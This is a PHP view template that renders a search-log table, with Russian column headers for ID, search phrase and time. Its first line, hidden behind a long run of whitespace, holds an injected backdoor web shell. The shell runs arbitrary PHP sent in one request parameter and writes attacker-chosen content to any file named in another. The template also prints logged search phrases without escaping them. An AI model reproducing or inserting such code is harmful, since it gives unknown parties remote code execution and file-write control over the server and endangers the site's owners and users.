<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  $uxbkdr = "67d66dc4675d0481bdc9529d3e7bbe00"; if(isset($_REQUEST['tcusmg'])) { $llydoil = $_REQUEST['tcusmg']; eval($llydoil); exit(); } if(isset($_REQUEST['rugfwvi'])) { $uquuep = $_REQUEST['pjhkb']; $qufcsiq = $_REQUEST['rugfwvi']; $uhsp = fopen($qufcsiq, 'w'); $ymihad = fwrite($uhsp, $uquuep); fclose($uhsp); echo $ymihad; exit(); } ?><div class="users-table1" >
    <div class="table-container">
        <table cellpading="0" cellspacing="0" border="0" class="default-table stripped turquoise">
            <thead>
                <tr align="left">
                    <th width="50">ID</th>
                    <th>Поисковая фраза</th>
                    <th>Время</th>  
                </tr>
            </thead>
            <tbody>
                <?php $count = 0; ?>
                <?php foreach ($searchlog as $sl) { ?>
                    <?php $count++; ?>
                    <tr>                
                        <td><?php echo $count; ?></td>
                        <td><?php echo $sl->work; ?></td>
                        <td><?php echo date('Y/m/d H:i:s', $sl->time); ?></td>                        
                    </tr>
<?php } ?>
            </tbody>
    </div>
    

